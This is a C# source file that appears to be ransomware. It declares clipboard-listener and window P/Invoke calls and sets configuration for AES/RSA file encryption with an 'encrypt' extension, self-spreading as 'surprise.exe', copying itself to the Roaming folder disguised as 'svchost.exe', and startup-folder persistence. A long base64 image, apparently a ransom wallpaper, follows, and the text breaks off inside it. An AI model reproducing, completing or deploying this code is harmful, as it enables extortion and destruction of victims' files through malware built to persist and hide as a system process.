using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "encrypt";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBxMSEhUTEhMWFhUWGBoWFhYYFxgWFxsZFxUXGhcXFxcYHSggGRslHRgYITEhJSkrLi4uGB8zODMtNygtLisBCgoKDg0OGxAQGy4lICUuLS8yLS0vMC0vLS0vLy0tLy0tLy0tKy0yLS0tLS0tKy0tLS8tLS8tLS0tLS0tLS0tLf/AABEIAKgBLAMBIgACEQEDEQH/xAAbAAACAwEBAQAAAAAAAAAAAAADBAECBQAGB//EAEcQAAIBAwIDBQUFBAcHAwUAAAECEQADIRIxBEFREyIyYXEFI0KBkVKhscHwFDND4QYkYnKC0dJTVJOUssLxFZKiB0RjdIP/xAAZAQADAQEBAAAAAAAAAAAAAAACAwQBAAX/xAA6EQABAgMFBgYBAgUDBQAAAAABAhEAIfADMUFRYRJxgZGhsQQTwdHh8SIyQhQjUmKSQ4LCBVNyorL/2gAMAwEAAhEDEQA/APi7CuC/SrNvUHYep/KqiBCoqarXVyigxjYKgHQ/Ix9MV2Oh+v8AKpY/r/Kqx8/1ypxSBKMEWx5/UfQiKgRvn8vwqm5q4+X5GuE4yLhgNp+uR1g1Uv0Ofy86hjzrlHWtKjcI5ovbGQZzv6/PrRFbGDt15DmDQvl+fzFXMCT5fIj8jTElqNYViJnDdpowVEkiTALpE6Sp5DO3kOlMduWByAzGNhBZTOoYwTSFww3pIneJOJqwjYiJ5bZHMHlNUotGDVl7jeScwEFAM6q6H3vdpgx4JVoBII8aPQVulGUyCDzAGUO9CW6TJHqM7EbofKhcQwwAIGSMzv08qbaWg/XjnnXZhhAIs/24RtNeCMGwoB7ORtodSR9DmqXfCNZnVb7NnHfzqm2T8qR4VwVA3XvK4nkcg/Ku/aFKkwJKICO/4kO++1U/xA2XlN+30mTfuhHkEFmp6OOEaj6C4EyO1Tbk9tcgzyI5iqErEg/BdIeMAMTrkbyv34pMcUCZW3nXrMzG0EDND/aUGNHd0Mm5nvmSZph8SgnBn1zBlpedMJSgBYKubtk2e6GzGAD8FqScJoERHOW6VYHvuFz33djEDYhEzv8AypP9qQzKQO5EScJyPe5137QphjAgu5TmSfBHX1pfnpNxHw5rEmfAvJViDQFb2iXuQM5KpnMmbh8Eiq3LYLETuQD8hOgVVe6IA+AZ63H2j0qpIAxJIJWeWtsk+cVOo4GrxvMu2RBh6ROVUe8Q04kxB1kcgOQgb1Db4H9sA8yeZnp0q5WJXT0Cg+WS5rtgCDMz6sdo9KSQa5e1ECGA1VdTApzvMjRMeIz5cvOrhzvIHWN8HFtBXIuwkSDoJziZOORNWROiiZBUcwBuXPnQgGnjS0BKMpLYkbjpq5Gi2SSJEYx0RRzMcyaJ2WI0nfCzMmJ1u/TNBuWwrSBKgjrE8wD612yUzwrSshHOFb4P2RImBp5TAQDrp5k5oFxO9q0kJI5Y9Y9aZtqNOrOW55djjAA2G1dxPC6R3iRqiScudjoCjpTjZlQf24c6NzrCwC1VV7wNrErOvB+IjeOVtBmoaxB06jq5gA6z0ydhFN2LhVtEA6AYfRNyImEnnn8aBfYLnTBOILkuUO5fpypps0hO1zvlmMcec/1YAFqfZ5en10EJcRZOWkbwYMwehoSrv6f96VpPaBhTON9GEXG5J3NIqvi9P+9KktrLZL51XvKHotNocR3gOmoohWq0kphoLwNq47D1P5VLVx2HqfyqciGQOKuo+/6VUUaOm3WZFahMcTA/L86hquJ5/wAqqACa0iMiAKkn9cjVvP8ALNDauP4iOEQBNEHL9fWrNbgxgx0n7piq7+dcA2+Od44D9dPlVid/vG3zArs+Xz39KlVnGSenP5UYDSrGs8pXYTBtmM+Yn8CRVrg2gCTuPMfEKoVOrYmZgwc74NR2ZjwuM9DIPl5U4Kk1dqxfBUpRdm+IAdQY+oNCdxAAncnPKeVToZiYV+ZiDsASSfQAn5UIChKyar1gkgZxYVdFmqhaf9n8MWYUdlZlSgBArWEhzGh7P4KBJ50l7S4TQ3ka0eNvaIA3pprIu25icHGd4PSOea9ZdihSfLTeI81NspKhaKuMeWioIpi5ZIMRVDbryygx6IUIGrEEeWR0o9i5JxCwO7OwJOTPWgm2aqUNYCpMaWMOACRuQR2YHMj4nPQVw5NjBInkqDYAdTQbVw4U4GxMZgnInpTBB6g5B392oBkZ5k01KtoSqqmHhZDGdVWUV7IkTpHkpwBPxuPyqyJg91ipIOIAbAHqEn8a5k5wSGIOMlpyBthatewWMkci5yRz7NAOdbsivr44XiSar543cQpJJJgRqjFvBHux1xV20sDDTOCT3LajoBzNQyHmQTv7yAEB56Obb1YSSPd4GQxQ7xk6B1jFNA0v3184gmSyem6vXRorZ1KQmqBMgiOayIJ2nAowYkEEAECQE77jMmXPNqFxPh1EOCTgvu2M92MCr272tQoBAUCQIRJ+27+dHZfiSl93tnLR9AZECuYCm31XeEryiNgGmYBJIHMuetGsjPcJIGdIGT17RzinFR9WpJIkkBBCSN9bnzpS1YcHQyTPf8cCIOSRumPurvKKVAgX4tymHE928XRvmBQY4a85aUYF2RA7xHkHfuAdQOecUPiEIkhTEATo0AnWNhTYtnx7hcdxIAnA0E4JBzVzwzEFZILx+8fvmCCAE5VhsXSwB0x3XZ4dxdG+aAQSRr6/NGMgzU6aMbR86r2Z86h2TFW1C7IatoGkbzJ5CIhIzO+/LpUsxqQeR/X8v16p2BBuYi1b5hXPmFmPvqTbB5538MY880VAQIYiDkDXB6SKtpBPxyuIka+eZ505NkCkevp6QBWXf2hcxuP8hnqJqoTG0eoj76PfUmAJzyIAOOtFTeTq+RBT+Vd5TqL9ucbtsIVjp9ZyPrQ1B3/lTV5REFiTylTP151VLYAywzmChj60Ckfk3tXrGhUvg+0DvJkjPz5fOqsOv0P5GmrqkHJA3EEORvzMV3ZjYwOYMFx+G1b5bvVcWGkYFyELraOQB9dj5zUuJkeXPB/8U01sAAakyMjOg+h5UN1gA5ESPtgZyDRmyYV9Y4/MCLR4G+D3vnOQRP40FnnmY5UW8ZnEGZPP5jyoNJUSZCGJjhVwagCrBa1IMaYvaM16HhPdANzGaz/ZXByZPKje07vwivT8OnyrM2iuEQW5FovyxxgPFceXYk1p+wvapU6TEEH8DWEFolmQfkfwNAi2WFbUdaWFmpGw0bPtuQdQAg+VY54g1v8ADe+twd6weJsFWINP8SFBlJMjCfDFLbCrxFH4g1DcQaqEkxRv2M8yPrUn8xTkPFf4JvhZ7s0bhrvw6Q0kEAzE7Z6iufho/wDI/wAqppA6/Uf5Uv8ANJcwbpIYQ+GI1FtYGzvJSSPhROYo/C8Q2VWI5C2gKoPtliMt+dLcNeBUkudeys516cr4FjONfzijtqbBR43kkWwcDv3ANtq9BCnmknr6Od7g8TdEsNJQrtyI5XwXCmXSDMgE67pP2zmIqIJWdek3I71w+8fMjQibCedHQs2UbaA3ZJkmMAOdkAH6mpbtMuyaZMDs0Fy6d8AjA9aaEctw5uC3Y3i53UVNw38mI9xBeHtCYLoY8eO1usQO+kchMj76zbKsHKaQNR8FwHETB+QmnbNvT3B2oL98wU7Qcoc8hz+dB4u02CNELA7lzWVkkgsfMzWWqZO11HpnxF5jrJX5M99Pz+CLoYDa1MyQuQ7jsrXIQAMxzpbiXIAupcmITCFEAg4Sdxv9a1rXCgFW7RCDEvcuyTMSBbBx0z0oPHcBv2naAAGGuOBkbBLY3mm2idpGuc+E75auP7hCbO3QFge3Eb9zHSFeJBbD69I+MuEQY3toN6WXiGjUSFZ5ylubh5Ezypixw66RpKBs6ptm5cmfgERERV0smXgOMiLRfssEZc+UjZetDNRCgfXDRiW5zxDiGOlLpIu0bHWU+UsIyr6lWKztEHblsf1/IEnrWhxlhBEROdQQ6wM4yefWgWrcj7q860QUqI9T8Rei0BSDGcy1EUVgaqoqMiKnhgW4AU/KbcoJzg9M/rmM850apzJj00HaIprRGBhftC798flXLqhf3ghF2QEHujNVeXhWGbc5DfE23jXTqIUC96QdhJPj8oHUZqwAifdwcHdJ8vKj8NbBLMoMzhQQDHX+VXuKRBbtGB5aEePWBXIspPXdrsI1S5tXvClyBCkQN5nXvzHlRxaidJKjMNrDp6mdqGV953sgYwMbY7vz2optovi0HbwKUO+ZHpXJYOTLkPlt3ONVgKrfF3t5Ma8/Fh0JPMjlQRbbGqRHNCI+aUUIrSB2WdihYGeUjnU2lBM6rZYAmYcH1I503ZmJjnKt3OFgsPiqwgLAiTDqNzsUI5x0NVK4JEDc6keR6EHnRrKDlDH/APFLx5lDgfzNC4xRGTLTvoKGPOaBaSE7XtfX9I4wSVOWqt54QnJmZzRtbEAgmFEAcgJLGPKST86Eq0a2MfJv+g1EExQpmfKKhj9o/U0xw1tmMAn6mgqtbnsfh4Usaq8PY7amie3tAhLwZvd2+ZrFuZM9af8AaHEFsDYUP2bwb3bi27cSxjOwnJc+SiWPkDVVudohKbhE9k1mgrWWxO6HfY3DWUU3+JUtbLiyqAwWcxruDqLduT5sUE0vxvsw2nZSZHwMNnRhNtx5MCDR/bHFK7hLf7qyOzt4GQD3rhx43aXPqOlOWrvb8Ppx2vDguuB3uHHjT/8AmTr/ALpbpXBCSdlok821Q1ssyUZj+kH9N+P9WqnuTGb7Pv8AZsOh3p32zw+oax86zZk8voK3/ZbB10EifQU6y/JJQboPxB2FC1yvjyhWP195qukkE9CBvnM8uex9Mda1vafs7Q5zSJs435j8DUa7EiLUWyVDaEK1w2o/ZedCK0soIhgUDF+GuaWn19ciJHnT1u0fCOzUtEi4+u4/QERis7TWxYLBQ5BlxPubU3CJIkvtOOVV+FDuDVadYm8SWDiq1hhLUyhW4FG7NFpO4D4AM6DQrNoHw3UCoPBbd0EnYG4d9RjNGCqjgK1qRgm65L5wQLYON4imLiIzZW+LaEkyiW7UDMcienzq4jFp0WeRlxjzjabMnLGrpz4iEktgSALGu4QgVCXw5z2ufTzo97g+6QHACS5CWiluUGZc70dmfS2kXHXQdCix2aDGDO+N5XpReIRnWLpuNbx7x74VI+2E5/OhKXDfHb6hfmqBBcVvaejvkTh3szi1VNKSr51FLXaOQdof4BFTxYHaBitvIUnXaL3zgTIA0jn4cVm8BkMnwdxi3adlHdgaj0PSnGtalATtNIkf1e6hG89930tOa6zJUkfMZbWaU2hV7dT2BuzDQtwhB1qvaAa9co6oQuwRy/IevWrXANQLhCoBS2xP7RDzPfjJMTA5UN1c3XDKqgqC4ud4aEiHJG58xzNTaVpQpoKhwpCW3tgG5Ka9mJI+ZxtQhUqzyvkJyxh6khyrBtThc8w5wldA/aI7gB1sZkObXZACD3BiTP5Ujwy4Pr+QrQ4hX0MAS0jv674uOACCe4Mct6V4RMH1/IVN4kOqvWK/Dn8J51dKMhq61AIkSJEjynNc1XssVYECYIx1ztXnC+PRwg94rBkCMwOyKHyg8qlx3hITXC47UgyFGI2mrXUYBjFzIMh7gYCecDOKNcssHCmdcL3jZ6qCDr6QQZ6GatKXU0+W/wDqPLLjEu0ycq06xn22Ugz2eomfeTEeXnM0YImNMGfFF0oJ8s7VbhWMQA8zJKKHn1J/WaJcGo7QQO8HsEk+Zius0/iFH09cc5XRq1Mogevp7wLgbR7QhJbfIImJ8YJx8/OmuJtlWAIutJMToJGD4ImTzz0pThmIZtITQdw+2jWI+cxTQZs9mtopJ1wSOR3J2xNMs22G1344Bi41eAW+3w9KlE3OGOz9pnwk2wCCM4adzEVNpWII/rGI3CA+gPP+VUnBE29J3i6WyPACT4ATzqxypBCAA498Yn15Yptxu6q5Oz7ugxhbuJnt7xxYnGl98s5Fp/IDrz+tJ+0AQQCGEDGs6yZ8xypl5AGrsNGyaybmecEZpfjlPdnREdzRgRJ685mk+InZnhl7O2RxhljJY4zqXCEgtFtr+B/6TUKKNZtzMAnDkxnAQyfSogmKlKYEwTgOFLtFbPF3AiaRuarwNgIsmszi72pq9ADybPUxCT51poIDWwg7Dhy38XiAVXqvDnxP5G4w0f3EbrS3sjgxdud8xbQG5dbpbTxR/bOFHmwqPaPFm9cZyInCqNkQCEQeSqAKSmQeBtv51p5OAYq/4p4mZ0ABkqB2rMz6fmKY4LiGsXEuJ4lM+R6g+REg+RqnCtg/rmKrfOaYAAHg1fkSlUwYa9s8IqOr2/3V0dpb8p8Vs+aNKfTrS/C3SjAin/ZjC6jcK25PaWCf9sBHZz0uL3fUJWazHaIiiYD8oRYksbJcymTnEYH0OoMbfHobtvUOWa88UaDg4In/AOdbXsXivgJ9KD7Y4UoSRsSPzo7VO2naEZYK8tRsjvEY5Ruh+lVKHofpRM1TnUhEXgx3Znoa0eBtnRgu2TKC92QAxkiczn6UiDTvB6Cp/dh5n3iFxojlG2ZptgwXf29XEJ8QSUXPz9Jw1bIHdtawRl+zQXsnl2nlTHFICfeAaREu96Dt4uzGA3lFCQppUDQBnKXP2dGfnCHeBpzRuJKiC2jQAN7RunTH+12PPOqrpNp06ybUR5pKtrXr0m//AJO0FN9tesKA8yguX/8A2e7x5d3FB1AqBp4fAHaG5bd7uv49vOdqlx34bRrJEE8OXOfB7zmQI70cqsnalRjiRpkHs+z0OQTL5ydRrBM/XpCVJAE9MSN178GhXhf3j6I0RMFO07giO5zORTlwKU1XCmgPA123td6OQU5H86WtgveZiHtkjWqg9m5MDAJ2nJ+VOHWFLH9omY7MFL5jkcgwN6CzDg8a+IbbFiDdITefNn43QlpY3UOoCUOg2pHdTX3FD85nfrTD22Ohm7VWDpo7QpBJYDAHPM7bTS/EAdqhulyCJi4II3ADhdlmDjzqO6Y1mwDKBTa1yO+JJnERNC8lD1aGMSUkZZPjwf8AulmcYv2aZCi2GAOoJZe3IGXTtOUgEcqR4XiQgI0K8mZbXIwMd1wIx99aHEWmKkM18KAe89xChgGJA3B/OsWleIEw9VmJGKPCh0nhiPRoziatbbIjeRHrOK4nyoZNeW7R6zPDojIXstcHYNO2QCcDnRwqwACSmO928evc/KqsreEm5HNu4E9fMUG0wgFQmwn3Rd55/KvQB2VZchwxG8g8YiP5CXrzl06xbhyNJBjSDgm4be48t8CmT3gplwAIGi6AhjzOZpO0xl4woMwU17nGOtGuOIBbRGQO0tkH5IDkVtkoBPrLPWbbxxjbVP5feURY1G6x8BySANeMGAOfL8aZOpjILjJEXLYCmQZgDfANJ6D2o1NvBkdzEY9Noo90LPeYKZ7h7Uu4JYZ32ia6zMi73678Px98DGLH5Bsqvn7QRNETuoywFjQDyB84JB01ZPCSxBAiJsQgJ5gc6l5GbnaQuQXuDJG3cG81bhi2+q7LAxruCf8AAnX1qoCbY/7t2d2Wrl5wgmX17X00UGqNQLldgqWo+gOAP7VLcbbypJeSNniRG23L+dMukmX1hvhD3QC3l/YFKcVpA+ANOyOXxGdZPPak2w/A+pPY3buN0Msj+Y9Go74XK5p/2XwgYydhSVpNRivRW1Fq3SvD2YUdo3CD8RalCdkXmFvafEADSN6xxV+IvajNafsGyqluIuAFLMaQdnv72rfmMFj5J51y1eYuAUoeHsdo8syZAcTKC+0PcWl4ba4+m7f6gx7uwf7gOsj7T/2ayRTboXLu51M2Z/tlwST1nP18qELNEUKeAsE7CGUXLuTmTfwFwyAaPQ/0F9l2uJuul0EgWtQAJGdSDl61le1rYS/etjwpduKvPCuQPwr0n/01XTxTZ3tMP/kh/wC2vO+1k1X7zfauufqxNcApyN0SoUf4xYKi2yJYQgjkEEEggyCMEEbEVre2FFxV4lR+8Om6B8PEAanMdHHvB/jrLZINaPsa+gZrNwxavAW3P2CT3Lv+Bs+hetEpGKPEAytU3p6pN46ONQBjCFi7Bkcq9GWW/a8/zrB4/gXsu1t1IZWIIg7iNuo6Hzpv2LeKtBmD5UdkqbGA8SgKTtpMxMRnX10kilwJr0Xt72YcOoOawUQhiIMiQR5jelrSymh9hbC0RtCK6K1fZ4cJhboEk6rYBnbcHJiOVJlz0NaRQwEZUZ0wAlw27o5xtDb06ySxcPXXlCvEL/ECu4HOJuXZCknBwO0sF5YEgk6NiYjT5CjcT2isbhW/3RkW7g7OAOaeID5VNgktNs3wHA7yOjJOgeND0iM5NDPFHVrC2nYGGZNYeJ0E6SYPSdqoJk9dX6dYgYqLNXBt15OkXPDtOlTfCE4dLo0R10ThR0oCoe6H7IuAAAbty28R3AYxMRXXXRnJYWAMwUD27g30Sh35b0wbzSLem6SuFe5YR0xsQ42HmZoWfXl27RwdIe5947OcZ3YFoQsPquubijUZ3Q3AHkTKDykUwOzAx2HaA8i/DjRHykzQPZzuQ5C3IaJZHCODk4L7zOR6U6eJbSBpvqVmWuWBdLDpjkKCzml66lobb/itrrsdMgCW0hLureXQCxIzoPaQ5BEo5304OaYv3Y0i72rAsvjRBADAmCOcSKWS4GuMyBNOgK+r3aGYBgDKaiMUUXNBXs7eoF5JS4boJQHAnwbzNCP0lrjvPQYfUNIO0CbwBe2+8zB3DUwG6iZ1Dh4g6ezDC5Md3B895rOrT4u+VUqw4ghhA7TsygPXWOYrM/aD0+6k27BTHt3ijwr7PzGc1zcedD1VLCqxXlkmPUYQ6GWB+62zrktPOFpizcUiALgCk5DhBkkjWTz5UrwryIGsHM6FBJ6ZO1FfVOVGmJl87QCTo55GKvslFgRdupsHcPEq0hyPX67xUybkzEjGh94ERr64505bcgHxA4wji6+euuYpK/bEKxyshI0aBG50fQ0/wVsMTGRkBUtkLtjXciR8qbY7W2wxmJib4/XIzhdrs7Lndjy++cLcWIIY6pO4cgmBEHG05+lNi4DJQalz3EtQM/bc0C9ZGhhoQmf4SHuQc63/ACovDkMo7phRBm52dr1POTRpSRaG6c8b+HMuCNIWohVmDlLD16T3GLWFtiAFtRA1A2zcvE/GCIxmRXG6NXaMiWyWx3C93B5A7Hzq5WRu5NwlvcR3thBL5AEffREtuSYfuoANFtw9zyBc7HfPlTwJADoPnLIgzxE4QSA5PX6zzHK6A3LahypVCPspbJuZG7vuDU2YYOoGrBAS3bCIp63HeMgZ6yKI9oQtvvhsl0t3Pvu3KY4bgjeYeBxJmLkWFjJe4YkwCM864pqfLhkUt/aIxVolKXOE3lz6Xu5zN0A9l8HBJaRGNv50P2xxIJ0gnHl/Ot326i2rQuK+rU+idBQSB/Dk5QRHyrxly5JmprVQs0bCYPwqv4g+blLjjeINYsa2VFksxCgACSSYA3rR9r3ghThrZlLMgsNnv7XbnmJGkdFTzqfZimzZbiQPePqs8PG4xF3iP8AOgH7TnpWUlpttJj0P3VOHSIaP51ttftQ4GqsT/tH47yrIQwt859PzFR2xqEsnODt0PUVIsnofoaLaVDmTHpv6D8XaS8zcQxVRbOkqbgOokc7edtVZvtm6vbXOzPc1HTv4ZOk5ztG9J8MCs4P0NRfUkzB+hpuDziUWIFsV5jhA2aTU4HPNcbLclOfI/d9ar2DfZP0NC5yigNG5xK/tHCrdGbtiLd3q1oQLd3zK/uzv8JrDVoO9P+x+IaxcVyhZTqW4kGHtMAHQ+o++Dyqvt72b+z3igOpGAe0/2rbZRvXkfMGuJMJskhBKMMOcxwN2hAwjd9ncQL1rQxEjFeevcObdwio9mcV2bg8uda/tjhg6axmKeDtpfEROE+Ra7P7Vd4z+EAdwpMTPSdiYE4k7fOtDtjKsFL9mUlbloG+BO6MN6y7SBVhraBiZHbAwyR4Qx8Lf5ijFiDpkkOgPZdt7xc/w25gR1pqHInWlT0gbdIWpsOHShvwh6yisXzb1DK9jNq7PQoflv1qRfuSGUnSZRy4Szd2+3id5HpWeeItkWwUGoH/7gaHInGl+o9aBdZVMawytBC3NbJjpd5EZolKApu/ydIBNg9/UP7cLhrGjc4i2vcum4ZIjtQO759omSDtjzoPEEdmTOgRjs72q22dtEzt+FK27pyBaZAJAIPaFTOcPkpgeGkeMvIYgDVJlwhTGIkfa3pFrahKSo+3eZ5AdoosvDOoJDtz1eUuZPrGpw5UIAzWyH76q4f8AuyLi7HG3pTL3J7pAlBAFq+Q4AGAQRms20QO6naaeTSly2fMgjuTQX4qQXCguNzct6bg5TIwa3bCEzrO+/STd4zyStUvX0u1vOcaXD8TqL3e9kkFLYD4IJlwdx/Oqm4Zmba2yCSDaKA6zoIe2Mk43rM4S8gA0qhMGZuG3cnOxmIiKkMNTMDdYgx3GBMQDmfGJkfKlptXSJz0J36cQOkOVYgKMpCVwuu1wuJ6wxxF7SpCC3pYiSjucjMQ/gNIdrU8bdJIBmIkSAhzjIHPFK6vKpLa0dW7h2HvFdlZMmAk1FUJrpqLaitob4Zt1iQ24mNp5jlvTaCY0uAFIB0AgDWQCZPj5fSslXIMjetMg7NOnmZCIPNQN6rsFOCGu+xO++eIGl8T2qWL11ldKGbmA8yO4QC9yXORgIMRIFU4Zg6iRhQB37mi15EwJJoHDOIhcYzCTcJnqcAVZC2vTpSGMgOA4ETkRziqUrBUFYGRuN+Z6OQ++JzZkAjHlGrcJntFcsNwS4t2RuM83+maSsIw93Ft9UEaxrTbDiN8TRhc1iWXwyVa7tyn3YjAFA4gyO0BeZABICTje2BkAQKptV3LGE+GN8914a4zAhNmn9pxlxw07HMYw61wQ1w9pGjRLxbRgSJREHeA5z5VHZBvdtIjJFsAW0xvcd/GYqlq73QdSEkZZ/eXZ1DuJbP6M1Z7b94sMT3LbuAgHVxOdOO750bg4O+m83zOXGQ2jMJ2WfAvn9XcJXsJFnhL4lhbhl0GLYSAB9u7cevWf0e9nhF13BvbMmAOHRCdgCD2hlBv5V4ksdOLesYJKHslcieXxoJGfKvTeyfaaiy4Z5dBCl8cNbfYBF5svWsMw3uOWm4kZDOD/AKhZLKPwxM86e9wON0Lf0gttda2zwy9mpLvi0iNns7Sru8Y9a8zf9mMuSCAdpH4+deoF3W6FnkwwR7gy1x9nCfYU7TFKFEZB4yDcxt2t27EE5kKgFDaWaV3w3wtuuwSE4fJuweiAyjGRY4m+ihE4niEUbKl24iiTJgBoGc/OjD2hxH+9cT/zF3/XROI4cKzBcqpjVy9CdpoWkb0AQBFSrKwtDtqQkk4lIfjTwROP4jM8XxP/ADF3r/foi8fe58VxX/MXf9dDXTQyyg+VHdC/4Xw5/wBMf4j2hk8fejHFcVP/AOxd/wBdDHH8T/vXFf8AHvf66qGSrFk61hnGDw1gP9Mf4j2gn/qPFQP63xHP+Pe8v7VWHtDi/wDe+J/497/VVA6wM9fyqwdI3zIx9ZP4fWu2RBeVZf8AbH+I9oL/AOpcXA/rnEbn+Pd8v7VK8Z2t5g1269wgQC7M5A6AsdqMtxauLqwcZ6zt1xWeWmCSdg/iluAhT9jXzr1n9EuGV1YuwhSBkTkyRPQYrH4axOl4UiZ0au+yIe/oHPmK2+A4ghi9vsxiUcYtvbnNu6o+NRnacVuzItEPjrYqQUAzzy0+urFsj+kluzb4hkMqLokpvaYuTFy23wyf1isWABkaRbI7t0SUcnGi4nwE1vf0gvvdZYCRoxok8O9uc5PgcGfFWQ6ttbkpB7NpNy2wAylyZimpEg9UdRkxJBhnhFfyUg3tnWG83zYEBVro1xc1w0Erh0yR7xH5Cgi2wUhRpHLPaWHkgfHsc02uoCJChSP3UnSZMi4hyVkmk+xVmwASQIGbdt3k69B6xH30tTvqeB6Ob8gBhmIvS3DmPQcyTjrFWWZk6yskxNu4uZMdRQF77ltJI9NcYgEjn1onGM6wM5BEOB2i8iNe5Bneq2+HIlNyDMIYuKY3E4OIqVU1sAZX72lmbqDSpTJG0caOQrHHsQf3UzAglQesjk1Avhm0qCcySmvWBHOZ29elMXicHU8RGrFy2394DY0uqjLL3VmMqSDI2PQUu1/pHoJZz7ksdYZZ509UIYZ8944IPdIBHhOEYbUBVAA/d7Z1Eo88yH6VwBBhVAEa5Lzb5wR6nFDvGAZ196YBh0nqH8qBRLlRwrHszZCOSLgMaw735mKaJaA4gmNTnG8ST0oWqhQaiotoxUERJqKg1NA8HHU1w7CNwDO5BMDloHWlaJYuaTP/AJ23HnTLNTKgVhxGhJkyrgMAJkISZ5xtP5VBQGYIGgEwgMDr7z7X+VVQDAHdZoP27m8gv09KugJXIDZOPBbEHd4361eJlqz33sZgjTGIzKdZbsxfBuHu+EhskZP7y6T9gA7CtDjBLyVSO7vDu3dHu0QbeZ351krcCMxAYKwgOMHkToJ5b/Knrbj92JWQPBl0GkS9xztIiqbG1wN9NfnmG4h4RbIm4rPlr0LQOyxtsSyFB2cDREgAoNU9cZ8yaIFVtKxpDHUEA1uZ/iXDyEUPRMKDowYQZgHJN1vOBj0ofB3y3dO2jYQGeNkL/raloKQdg3G7o+R6AzmP2xpSSNoSb6BxFX4w03EK2phiMG4YOgHGi0B160Q3c5eG0A2+1IGiSQSQMF4iOeaXZmju9mDO8KET7CAxlxv5TXByDEg9UmXe4RntOij8qcFl5+3rfzIOZYBRSMK6UMg5hvXqZcwSNAuH94yDxkD4Jz3jVX4ttAVAEOSORS1GS7nYkxS9p/CJUz7prgkGEWdKeu0jnVi4IIuAD+IwHJBsjmcknPWi8wkc/TGpPeUlQzywK34d/QFoJceCUVhBHZqgOFQiXuP5xml7loFQbc5J8RGyfxPIVc3IJbSDKF2eDkEQltAdsRVJ7rhyJ7iEIDgZPZpBobRQVJQ+Mb30IlLC5MySCmadPb2OeP7pCYFTDGD+ooTbz+vWtJOJcHUU0Akl5G1u2AAhnrSg06Wlc9n2uuTgk9xOm1LVYvcc75bqwmLxDE2uYyunvrGFhPWrietNXOFAgAnVrRHkCO+Nx6VAsrOGOn3hOBPu949aHyFj71bpjBecmuf1AW2GcycRyhYM/X6VAJo3ZqNTEuV0I4GAYuGM7+HNMWkVe6wDe9NtjGQCo7Mg8qNNgolqqR4AwPnACt/rC9qy7FRBAYhASDEkxvT9jhoPiRidaISMdoh8Dg9RMGhWrh7Mme6lo22HS5a8Dj7qZa8uCQCZtveHLI8aDpJE01FkkTqvnKc1paWipDpOvWWcrCwe5IKDDpkI6XCSDbGvcEg4rreHVlTSST3hJe3dzIuDmh29Ktdytw3REDS4A8ekApct8hEmuucSZUKwPcAIcgC7bcAF/wC+IPninNnXtdzcC5MImXrDkb/U3lqXuKSGA1oA/fgwUfYOE+wfI9KDcYEtKsxIUuo12tW+u4gO5Hc++oN0kZcSXNtLmn/ZsCiXX372OXKqXEL9oF1ahnRnWlyfgfbQc86FU6Gu8dHed0gxCQNOem49ZaGZuL41ARPu57Qkg6D3PeIB325fKao3FLgOe6QAUJ12mQCNVsgYP0zXKhJUiZIgXMk6wO/bvg7CaQb3o0qAgEucmNhJHT0FJtLRSN5u1uovzUJB9nZpVuHTvWAM4pwrqXJMnHdDtEnkCY6U9+3QNRRiVwJALp5gx302oK22gLiIgje04ncHk2aBdMk5AA2+C5bx05iko2rNNb+lN+qHLCVmqppzEdxPHQCFVO+NxMHP2ORxXWeKI8GAcagZ/wCIhxStoMTqJkkEATDx1T76pc73ViDmAQdHMPSBbLfa5Yct7vc+sP8AKS2zzxrtpDScc2HJ5FMIDbAnYr57/OgcXxJ8IAAmcdY+7FUYxJEDoRj5FKVDEn13mkWtsttlzXvp1hqLJLuBXxFmvmq9pUta88freqaKmKlw4BMGKiu0irGKpijYaQMTpFWtqMnp/nVMURDg/rnWyjDDvAqXkZJjAEAv6vvAqTbUMO6O7OvQCUB+Gesc6QV4rRF4MSymIGJwiAiP8ZqyyWlSWN4bXX0zZsBMwi0SpKnF1VQEFbSybnJEs894jlbtjlnejowllYBtIA0SEDkADvnmAOXOluHV5thRup0vo74QTMD8PWov2GYQLcNggfHoAgtck4mnOptoCfeV2IxcPfjtOYQQn9JNPwywMsGjSVlYeENjMQiO84SdyqifWleJVX0wFkSC+EUknFtOsdfOl7bmYgqypBJ2QKMlR1oqLOjSpBiEnMIP4kdT+NMVabYYin3d9Jh1QAs9gu9V9SS3WOJTuL2R1rhZPcBJ8ZG5I/KiBrYkrbJJOkEsdVyZ7Q+QjnSr8MSBotkNMiT3tA3d52zQ1uEF1us4bAnxGNyB64pQWpLBQ3Fhlq05ZZYAu0oSouk7w5pq3MQeShSMLsVRIkv5k9fKqyDqwIb3gTbCg5foG3ihkKxEriOey2xMf4jUFzjUAAdAuZzo5SOQPOK16oACRrZAjgKqubwZb7AK5JjLnMa32CAdKKvxACCrgzODdcPjbMUq7hvE0wTcaDgAYRAfnRhdMqxwBoJEfG4cfMxFGldznLtM5C5+Ct8LUjSdfXEbonsGCyvegaBz94X75z0o25Ns7NcFsDwQESScZOTgbUujbqsgIj2wxYCXLy77Yx67edHscTytyQHRJx4AO++R5UxBTIbpd94aT5bMLVtT4/BxbPnFbt4FQfig8TI2Jt4EjzA5VLnIC4ggODkf1jfO9Qt9SpBUaT2wJ5hASQJjG9Ca8GUYg9nbua+rggCcVpWGd3+A/UsXuwjtkvc1N2cNDVm2CSR4VS5b0nM9nss+cznoa5GaWZP3jpbuBfRouDNRc4iD3sBbkDlhxv8AhQXvthnMMyOhfaCHm2cbCiK0h3N2NzSAfSZLPK/KBCVGsL+MmfGGrNrvAAgabpAB5i4gJT1zU22AC6UOrsjoYnfszJt